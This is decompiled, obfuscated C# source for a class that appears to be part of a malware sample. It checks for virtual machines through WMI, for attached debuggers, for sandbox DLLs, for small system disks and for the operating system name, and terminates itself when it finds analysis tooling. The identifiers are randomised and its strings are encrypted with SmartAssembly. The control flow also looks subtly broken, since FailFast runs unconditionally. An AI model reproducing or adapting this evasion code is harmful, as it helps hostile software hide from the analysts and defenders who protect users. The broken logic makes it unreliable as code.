using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HuHbCLeSgdQqCa;

internal sealed class kJGeMsGZmbaxJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void NYiRfShDdXWuWFm()
	{
		if (XcTMIccYCTIxEOoX() || nXCtAZbQungae() || JNMQyMpfbTz() || ZSCmWBnJETRM() || HTYZBYIXaqhuk())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool ZSCmWBnJETRM()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool HTYZBYIXaqhuk()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(getString_0(107412414)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool XcTMIccYCTIxEOoX()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107412409));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(getString_0(107412392)).ToString()!.ToLower();
							if ((text == getString_0(107412343) && current.get_Item(getString_0(107411802)).ToString()!.ToUpperInvariant().Contains(getString_0(107411825))) || text.Contains(getString_0(107411812)) || current.get_Item(getString_0(107411802)).ToString() == getString_0(107411771))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool nXCtAZbQungae()
	{
		bool bool_ = false;
		try
		{
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref bool_);
			return bool_;
		}
		catch
		{
			return bool_;
		}
	}

	private static bool JNMQyMpfbTz()
	{
		try
		{
			if (GetModuleHandle(getString_0(107411786)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);

	static kJGeMsGZmbaxJ()
	{
		Strings.CreateGetStringDelegate(typeof(kJGeMsGZmbaxJ));
	}
}
